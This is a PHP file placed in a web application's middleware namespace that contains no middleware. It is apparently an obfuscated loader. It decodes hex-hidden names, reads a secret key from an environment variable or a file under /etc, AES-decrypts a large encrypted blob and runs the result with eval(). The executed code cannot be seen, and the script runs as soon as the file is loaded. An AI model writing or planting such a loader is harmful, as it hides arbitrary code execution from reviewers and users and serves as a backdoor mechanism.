<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ykwyeftp0n2ZaT5F0f6DOQ==');

$c=base64_decode(

'Ueys5xZgSWBKkO8Wrz6xknPt9QJhPdEt0Rwia4IpOMYRRJTQRFeHr9lmIiBR9oEmvuiu8lPEKYs7' .
'iaB1hAHhZ4iPacpFt9BMUGanf6W429T5vXh/ITjjm9n/WimGG7j964vA4XuPCzTJKYxugld4dz4h' .
't7ZRJo7YjDbWQGt3FcDzAv+rCwSzpfSWMXR5AB1yIfEBLuEChiV35u8MNidNUeJ765WooMWnXTrH' .
'qDfDWcoS+Sc8hYf1Ll+vTM51QIcaDS9ApTZalFCrXB72rkHj+Z4l82k5d79/SxvPF+PhZZ7pRAL1' .
'xyg1uXaFJHuSQjdl1ZaSmcX5J38BFaN/UO5/04TexghmCHDWvDcG7v2gmLJ5g/HkBYQ6t9MPJJB5' .
'L0EFYslW2LmRckCaMMb4po3O7UTC7vbMzWpai9tG/FP+7twZcijCIGrpxTSCX9wAE2kGvhO9LpPW' .
'RHJ7lyT7GGbIBX5FJ8spxIXSm/JX0Jf7tBMuO++a9Ja1VcPXbyz1EXw1I867YSfM5SVv2/v5Zx+y' .
'PvIbzKS2D9MlEyAfvkU4OOzNm3/9Yc1nWYdbYjLHnf5UN5S/7Vn3H0n9HbRN9VrDvgwyvcx/OOP+' .
'wkJtXEf5A/I0fS5qXgPEnuyD2OkM/GfQHrHXuR1qOStRiG8Fs1xpXYXQoGEY11JykvHnJr1XTt5l' .
'jxoefyr0sS6odP6IfNzZTVsugAHIjXsMiD63tgxubxH5mZiwTqvwO40wb7mnkCZfoqdYsMH/eWhS' .
'vp0sc6/oaa2qWvCwx3ifY+xceuc1Z7Ei+pjHVsk6kphGlwnoucTr6wdoWgVuWMvL8yon7Wk7EV6j' .
'QtRSMwU5ItxQTsTVk8gPUG6ghGmTTvSOEsYzXe4g0/xzsegyfqiD1r+nZU6yjnBm4u0Pwk4BjZUz' .
'L/H6N/ddhvZE7k9gYi9CdcB4dAbBrn55uXh5KOuySknmVlYHHKJq4QiIOugfUACebAFjwSowpITq' .
'9xy6oLvwWz6zw54J6DGwexPzWyeaFsE7rwTq6D7ghsMBLLXeFxwMOUZwd4Zt1NiweS3TFdXgS4MN' .
'IyRQER4g3zQOecLrgXuYgUJSIc9mUeZSPrUTurRiNhKs4YHTqdjIZs7Y5MyqAtuz3ZOEfeblrYSO' .
'hzS8dF34rfL9upysPWUUgsiPFLIXViluAGMaKSD1cnGcgWue3I8SSzYLX7ePssjpG6IYqqpD5MTs' .
'CDvOIImyvMMCBS9ydCx8MKo/nxXFEZzLXjgc39sZw6Bu9C6Jgc3dzN2JHuQ6GeNTEH6aEdL8YWvZ' .
'x8BFMAWNPn+A+NybMmEpUDw7lM1ILOnw7OyR8Z/07UV2H5y63GxYZTQyMb7vUpSE+k7uSjsP6qla' .
'ABw2cX+8pP4iCPLgA1HHRy9AqSlUZOnDL/0UoVuCM9xod9rHN4kGwfYdwN4KWdGx89/SP39PtcwP' .
'0dVM9uY36guQNjustQ4U5dUOh8m80DFdQ3wLb4KmcZzFkI9znvm9RP3hwmB6EagAfobUya3Fk9na' .
'95Nehh2gsFmEkG5M2NXVMpqpVlgtmF8HALqYJg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

